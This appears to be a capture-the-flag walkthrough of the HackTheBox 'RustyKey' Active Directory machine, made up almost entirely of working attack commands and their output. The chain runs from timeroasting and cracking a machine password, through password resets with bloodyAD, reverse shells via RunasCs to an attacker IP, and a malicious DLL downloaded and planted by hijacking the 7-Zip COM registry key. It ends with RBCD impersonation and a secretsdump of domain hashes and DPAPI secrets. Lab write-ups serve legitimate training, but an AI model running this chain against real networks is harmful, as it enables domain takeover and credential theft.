As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A
## NMAP SCAN
```
nmap -sSCV -p- 10.129.232.127
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-06 20:41 +0700
Stats: 0:01:52 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.00% done; ETC: 20:44 (0:00:25 remaining)
Nmap scan report for 10.129.232.127
Host is up (0.084s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-06 16:13:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  unknown
49700/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2h29m58s
| smb2-time: 
|   date: 2026-05-06T16:14:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

lets collect bloodhound data, look at smb, get usernames and verify them !
```
rusthound-ce -d rustykey.htb -u 'rr.parker@rustykey.htb'
---------------------------------------------------
Initializing RustHound-CE at 23:20:14 on 05/06/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-05-06T16:20:14Z INFO  rusthound_ce] Verbosity level: Info
[2026-05-06T16:20:14Z INFO  rusthound_ce] Collection method: All
Password: 
[2026-05-06T16:20:16Z INFO  rusthound_ce::ldap] Connected to RUSTYKEY.HTB Active Directory!
[2026-05-06T16:20:16Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-05-06T16:20:16Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-06T16:20:19Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=rustykey,DC=htb
[2026-05-06T16:20:19Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-06T16:20:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=rustykey,DC=htb
[2026-05-06T16:20:22Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-06T16:20:26Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=rustykey,DC=htb
[2026-05-06T16:20:26Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-06T16:20:26Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=rustykey,DC=htb
[2026-05-06T16:20:26Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-06T16:20:26Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=rustykey,DC=htb
[2026-05-06T16:20:26Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-05-06T16:20:26Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] 12 users parsed!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] .//20260506232026_rustykey-htb_users.json created!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] 66 groups parsed!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] .//20260506232026_rustykey-htb_groups.json created!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] 16 computers parsed!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] .//20260506232026_rustykey-htb_computers.json created!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] 10 ous parsed!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] .//20260506232026_rustykey-htb_ous.json created!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] .//20260506232026_rustykey-htb_domains.json created!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] .//20260506232026_rustykey-htb_gpos.json created!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-05-06T16:20:26Z INFO  rusthound_ce::json::maker::common] .//20260506232026_rustykey-htb_containers.json created!

RustHound-CE Enumeration Completed at 23:20:26 on 05/06/26! Happy Graphing!

```

```
nxc smb 10.129.232.127 -u 'rr.parker' -p '8#t5HE8L!W3A'      
SMB         10.129.232.127  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.127  445    dc               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
```

lets get tgt and try again 
```
getTGT.py rustykey.htb/rr.parker:'8#t5HE8L!W3A'
/usr/local/bin/getTGT.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'getTGT.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rr.parker.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=rr.parker.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.232.127 -u 'rr.parker' -p '8#t5HE8L!W3A' -k
SMB         10.129.232.127  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.127  445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
```

now it works let's look at the shares.. nothing there
```
nxc smb 10.129.232.127 -u 'rr.parker' -p '8#t5HE8L!W3A' -k --users                           
SMB         10.129.232.127  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.127  445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
SMB         10.129.232.127  445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.232.127  445    dc               Administrator                 2025-06-04 22:52:22 0       Built-in account for administering the computer/domain 
SMB         10.129.232.127  445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.232.127  445    dc               krbtgt                        2024-12-27 00:53:40 0       Key Distribution Center Service Account 
SMB         10.129.232.127  445    dc               rr.parker                     2025-06-04 22:54:15 0        
SMB         10.129.232.127  445    dc               mm.turner                     2024-12-27 10:18:39 0        
SMB         10.129.232.127  445    dc               bb.morgan                     2026-05-06 16:31:39 0        
SMB         10.129.232.127  445    dc               gg.anderson                   2026-05-06 16:31:39 0        
SMB         10.129.232.127  445    dc               dd.ali                        2026-05-06 16:31:39 0        
SMB         10.129.232.127  445    dc               ee.reed                       2026-05-06 16:31:39 0        
SMB         10.129.232.127  445    dc               nn.marcos                     2024-12-27 11:34:50 0        
SMB         10.129.232.127  445    dc               backupadmin                   2024-12-30 00:30:18 0        
SMB         10.129.232.127  445    dc               [*] Enumerated 11 local users: RUSTYKEY

```

not able to kerberoast...
lets try timeroast.. 
```
python3 timeroast.py 10.129.232.127

1000:$sntp-ms$1491a8352ccb7e3647ed5a4daff3d50d$1c0111e900000000000a06144c4f434ceda5e69073856a37e1b8428bffbfcd0aeda5ee94b79dd568eda5ee94b79e137b
1103:$sntp-ms$fdf5c6ed3ceae945d554d3ca8b380eeb$1c0111e900000000000a06154c4f434ceda5e6907477b6f0e1b8428bffbfcd0aeda5ee956498442feda5ee9564989811
1104:$sntp-ms$41560b9d9c9829225326b62680b2520b$1c0111e900000000000a06154c4f434ceda5e690763eed7be1b8428bffbfcd0aeda5ee95665f6d4deda5ee95665fd552
1105:$sntp-ms$a084b6756d6d4e0e062fe6db32947a1f$1c0111e900000000000a06154c4f434ceda5e69073863f49e1b8428bffbfcd0aeda5ee9567becaabeda5ee9567bfb8e8
1106:$sntp-ms$047ab32414d59afa6ef7dd21adc76a47$1c0111e900000000000a06154c4f434ceda5e6907505a8b6e1b8428bffbfcd0aeda5ee95693ed1cceda5ee95693f19f1
1107:$sntp-ms$be9c494c3d4b2a33c65551d7e9f27e6b$1c0111e900000000000a06154c4f434ceda5e69076af5acbe1b8428bffbfcd0aeda5ee956ae88df3eda5ee956ae8ca59
1118:$sntp-ms$f20538a89842eb2d8299f86022e95ce0$1c0111e900000000000a06154c4f434ceda5e6907655a477e1b8428bffbfcd0aeda5ee957a6e23caeda5ee957a6e41fc
1119:$sntp-ms$14424a25e3ff0b3f2ceb2151060aec00$1c0111e900000000000a06154c4f434ceda5e690736c9702e1b8428bffbfcd0aeda5ee957b9d9902eda5ee957b9dd3ba
1120:$sntp-ms$e4a315f74a7e9de0a4af82b37888ac0f$1c0111e900000000000a06154c4f434ceda5e69075114aabe1b8428bffbfcd0aeda5ee957d424950eda5ee957d428abf
1121:$sntp-ms$71e64b69a7de0274422f7589404f3ffa$1c0111e900000000000a06154c4f434ceda5e690765c53bde1b8428bffbfcd0aeda5ee957e8d4f08eda5ee957e8d9076
1122:$sntp-ms$99721449533224a7039fa8a6dee8e9f5$1c0111e900000000000a06154c4f434ceda5e690766e638ae1b8428bffbfcd0aeda5ee957e9f6f9ceda5ee957e9f998d
1123:$sntp-ms$6d9e30567870b432358c922cb66c17ae$1c0111e900000000000a06154c4f434ceda5e690744c348be1b8428bffbfcd0aeda5ee9580543a13eda5ee9580547d2f
1124:$sntp-ms$4a149c49c7d7c792515f976b8717a4a5$1c0111e900000000000a06154c4f434ceda5e69075ff0cbae1b8428bffbfcd0aeda5ee95820718f8eda5ee9582075203
1125:$sntp-ms$e4556b12558fa6477190b221fd2c1b9b$1c0111e900000000000a06154c4f434ceda5e6907379c33ae1b8428bffbfcd0aeda5ee95839a6cfeeda5ee95839a989d
1126:$sntp-ms$15e90255ad07a05beb8691246a2bec9a$1c0111e900000000000a06154c4f434ceda5e69074f6f595e1b8428bffbfcd0aeda5ee958517a2b3eda5ee958517c94a
1127:$sntp-ms$ff2f7a79267f14c9f0a9654b52c31279$1c0111e900000000000a06154c4f434ceda5e69076cd169ee1b8428bffbfcd0aeda5ee9586edbd07eda5ee9586ededae
```

got some hashes
lets crack 
```
hashcat -m 31300 rustykey.hashes /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 9 8945HS w/ Radeon 780M Graphics, 2255/4511 MB (1024 MB allocatable), 5MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashfile 'rustykey.hashes' on line 1 (1000:$...eda5ee94b79dd568eda5ee94b79e137b): Token length exception
Hashfile 'rustykey.hashes' on line 2 (1103:$...eda5ee956498442feda5ee9564989811): Token length exception
Hashfile 'rustykey.hashes' on line 3 (1104:$...eda5ee95665f6d4deda5ee95665fd552): Token length exception
Hashfile 'rustykey.hashes' on line 4 (1105:$...eda5ee9567becaabeda5ee9567bfb8e8): Token length exception
Hashfile 'rustykey.hashes' on line 5 (1106:$...eda5ee95693ed1cceda5ee95693f19f1): Token length exception
Hashfile 'rustykey.hashes' on line 6 (1107:$...eda5ee956ae88df3eda5ee956ae8ca59): Token length exception
Hashfile 'rustykey.hashes' on line 7 (1118:$...eda5ee957a6e23caeda5ee957a6e41fc): Token length exception
Hashfile 'rustykey.hashes' on line 8 (1119:$...eda5ee957b9d9902eda5ee957b9dd3ba): Token length exception
Hashfile 'rustykey.hashes' on line 9 (1120:$...eda5ee957d424950eda5ee957d428abf): Token length exception
Hashfile 'rustykey.hashes' on line 10 (1121:$...eda5ee957e8d4f08eda5ee957e8d9076): Token length exception
Hashfile 'rustykey.hashes' on line 11 (1122:$...eda5ee957e9f6f9ceda5ee957e9f998d): Token length exception
Hashfile 'rustykey.hashes' on line 12 (1123:$...eda5ee9580543a13eda5ee9580547d2f): Token length exception
Hashfile 'rustykey.hashes' on line 13 (1124:$...eda5ee95820718f8eda5ee9582075203): Token length exception
Hashfile 'rustykey.hashes' on line 14 (1125:$...eda5ee95839a6cfeeda5ee95839a989d): Token length exception
Hashfile 'rustykey.hashes' on line 15 (1126:$...eda5ee958517a2b3eda5ee958517c94a): Token length exception
Hashfile 'rustykey.hashes' on line 16 (1127:$...eda5ee9586edbd07eda5ee9586ededae): Token length exception

* Token length exception: 16/16 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username or --dynamic-x option is used but no username or dynamic-tag is present)

No hashes loaded.

Started: Wed May  6 23:47:16 2026
Stopped: Wed May  6 23:47:16 2026
```

we will have to clean them... 
```
cut -d ":" -f 2- rustykey.hashes > clean.hashes
```
now lets try to crack
```
hashcat -m 31300 clean.hashes --show
$sntp-ms$e4556b12558fa6477190b221fd2c1b9b$1c0111e900000000000a06154c4f434ceda5e6907379c33ae1b8428bffbfcd0aeda5ee95839a6cfeeda5ee95839a989d:Rusty88!

```
got a pass lets check 
```
nxc smb 10.129.232.127 -u /home/kali/HTB\ BOXES/RustyKey/users.txt -p 'Rusty88!' -k
SMB         10.129.232.127  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.127  445    dc               [-] rustykey.htb\rr.parker:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.232.127  445    dc               [-] rustykey.htb\mm.turner:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.232.127  445    dc               [-] rustykey.htb\bb.morgan:Rusty88! KDC_ERR_ETYPE_NOSUPP 
SMB         10.129.232.127  445    dc               [-] rustykey.htb\gg.anderson:Rusty88! KDC_ERR_CLIENT_REVOKED 
SMB         10.129.232.127  445    dc               [-] rustykey.htb\dd.ali:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.232.127  445    dc               [-] rustykey.htb\ee.reed:Rusty88! KDC_ERR_ETYPE_NOSUPP 
SMB         10.129.232.127  445    dc               [-] rustykey.htb\nn.marcos:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.232.127  445    dc               [-] rustykey.htb\backupadmin:Rusty88! KDC_ERR_PREAUTH_FAILED
```
bb.morgan and ee.reed has their acc deleted 
lets look at the SID.. 
```
MATCH (n) WHERE n.objectid ENDS WITH '-1125' RETURN n
```

![[Pasted image 20260506143744.png]]

this password belongs to a computer.... 
**SAM Account Name**: IT-Computer3$:Rusty88!
```
nxc smb 10.129.232.127 -u 'IT-Computer3$' -p 'Rusty88!' -k 
SMB         10.129.232.127  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.127  445    dc               [+] rustykey.htb\IT-Computer3$:Rusty88!
```

### ATTACK PATH 
1. IT-Computer addself to helpdesk
2. remove IT from protected objects first
3. helpdesk members can force change pass for many users but we will only do for which can winrm 

```
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k add groupMember Helpdesk 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to Helpdesk
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT'
[-] IT removed from Protected Objects
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password bb.morgan 'Password123!'
[+] Password changed successfully!
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ getTGT.py 'rustykey.htb/bb.morgan:Password123!'
/usr/local/bin/getTGT.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'getTGT.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache
```

have to add realm first then winrm 
```
sudo nano /etc/krb5.conf                                                                  [realms]
    RUSTYKEY.HTB = {
        kdc = dc.rustykey.htb
        admin_server = dc.rustykey.htb
    }

[sudo] password for kali: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ KRB5CCNAME=bb.morgan.ccache evil-winrm -i dc.rustykey.htb -r rustykey.htb
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> cd ..
*Evil-WinRM* PS C:\Users\bb.morgan> cd Desktop
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> type user.txt
d21a6a039429e66ce46cef9c634f02cb

```

```
Internal Memo
From: bb.morgan@rustykey.htb
To: support-team@rustykey.htb
Subject: Support Group - Archiving Tool Access
Date: Mon, 10 Mar 2025 14:35:18 +0100
Hey team,
As part of the new Support utilities rollout, extended access has been temporarily granted to allow
testing and troubleshooting of file archiving features across shared workstations.
This is mainly to help streamline ticket resolution related to extraction/compression issues reported
by the Finance and IT teams. Some newer systems handle context menu actions differently, so
registry-level adjustments are expected during this phase.
A few notes:
- Please avoid making unrelated changes to system components while this access is active.
- This permission change is logged and will be rolled back once the archiving utility is confirmed
stable in all environments.
- Let DevOps know if you encounter access errors or missing shell actions.
Thanks,
BB Morgan
IT Department
```

got this and support has some privs ig 
ee.reed is in the group good we can change pass and use runas to get a shell !
``
```
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k add groupMember Helpdesk 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to Helpdesk
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT'
[-] IT removed from Protected Objects
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password ee.reed 'Password@123'        
[+] Password changed successfully!
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ getTGT.py 'rustykey.htb/ee.reed:Password@123'
/usr/local/bin/getTGT.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'getTGT.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```
lets use runascs 
```
Evil-WinRM* PS C:\Users\bb.morgan\Desktop> .\RunasCs.exe ee.reed Password@123 powershell.exe -r 10.10.14.53:9001
[-] RunasCsException: LogonUser failed with error code: Account restrictions are preventing this user from signing in. For example: blank passwords aren't allowed, sign-in times are limited, or a policy restriction has been enforced

```

ok so we have to remove SUPPORT group from Protected Groups and then do it 
```
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'SUPPORT'
[-] SUPPORT removed from Protected Objects
                                                                                                                                                                                                                                            

*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> .\RunasCs.exe ee.reed Password@123 powershell.exe -r 10.10.14.53:443
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-771159$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4540 created in background.

┌──(kali㉿kali)-[~]
└─$ rlwrap -cAr nc -lnvp 443                                                                                                            
listening on [any] 443 ...
connect to [10.10.14.53] from (UNKNOWN) [10.129.232.127] 54952
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

and we are in !
```
PS C:\Windows\system32> Get-ChildItem "Registry::HKCR\*\shellex\ContextMenuHandlers","Registry::HKCR\Directory\shellex\ContextMenuHandlers","Registry::HKCR\Folder\shellex\ContextMenuHandlers" -ErrorAction SilentlyContinue | Where-Object {$_.PSChildName -match "7-?zip"} | Select-Object PSPath,PSChildName,@{N='CLSID';E={(Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).'(default)'}}
Get-ChildItem "Registry::HKCR\*\shellex\ContextMenuHandlers","Registry::HKCR\Directory\shellex\ContextMenuHandlers","Registry::HKCR\Folder\shellex\ContextMenuHandlers" -ErrorAction SilentlyContinue | Where-Object {$_.PSChildName -match "7-?zip"} | Select-Object PSPath,PSChildName,@{N='CLSID';E={(Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).'(default)'}}


PSPath                                                                               PSChildName CLSID                 
------                                                                               ----------- -----                 
Microsoft.PowerShell.Core\Registry::HKCR\Directory\shellex\ContextMenuHandlers\7-Zip 7-Zip       {23170F69-40C1-278A...
Microsoft.PowerShell.Core\Registry::HKCR\Folder\shellex\ContextMenuHandlers\7-Zip    7-Zip       {23170F69-40C1-278A...


PS C:\Windows\system32> 
PS C:\Windows\system32> (Get-ItemProperty "Registry::HKCR\Directory\shellex\ContextMenuHandlers\7-Zip").'(default)'
(Get-ItemProperty "Registry::HKCR\Directory\shellex\ContextMenuHandlers\7-Zip").'(default)'
{23170F69-40C1-278A-1000-000100020000}

```

got file related to 7zip 
lets make reverse shell and upload it 
```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> reg query HKCR\CLSID /s /f "zip"

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
```

lets use this as reed and get shell as mm.turner 
```
PS C:\ProgramData> wget http://10.10.14.53:8080/rev.dll -o rev.dll
wget http://10.10.14.53:8080/rev.dll -o rev.dll


PS C:\ProgramData> set-itemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "(default)" -Value "C:\ProgramData\rev.dll"
set-itemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "(default)" -Value "C:\ProgramData\rev.dll"

```

```
rlwrap -cAr nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.53] from (UNKNOWN) [10.129.232.127] 54373
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>whoami
whoami
rustykey\mm.turner

```

and we are in 
so mm.turner is delegation member, they are allowed to act on DC and backupadmin has sensitive turned off we can probably do RBCD 
```
rlwrap -cAr nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.53] from (UNKNOWN) [10.129.232.127] 54373
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>whoami
whoami
rustykey\mm.turner

C:\Windows>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
```

now lets add IT-COMPUTER3$ to delegate and get the tgt 
```
PS C:\Windows> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```
```
getST.py 'rustykey.htb/IT-COMPUTER3$:Rusty88!' -k -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin
/usr/local/bin/getST.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'getST.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

lets dump the hashes....
```
KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache secretsdump.py -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb' 
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'secretsdump.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25
RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
[*] DefaultPassword 
RUSTYKEY\Administrator:Rustyrc4key#!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397
dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c
[*] NL$KM 
 0000   6A 34 14 2E FC 1A C2 54  64 E3 4C F1 A7 13 5F 34   j4.....Td.L..._4
 0010   79 98 16 81 90 47 A1 F0  8B FC 47 78 8C 7B 76 B6   y....G....Gx.{v.
 0020   C0 E4 94 9D 1E 15 A6 A9  70 2C 13 66 D7 23 A1 0B   ........p,.f.#..
 0030   F1 11 79 34 C1 8F 00 15  7B DF 6F C7 C3 B4 FC FE   ..y4....{.o.....
NL$KM:6a34142efc1ac25464e34cf1a7135f34799816819047a1f08bfc47788c7b76b6c0e4949d1e15a6a9702c1366d723a10bf1117934c18f00157bdf6fc7c3b4fcfe
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
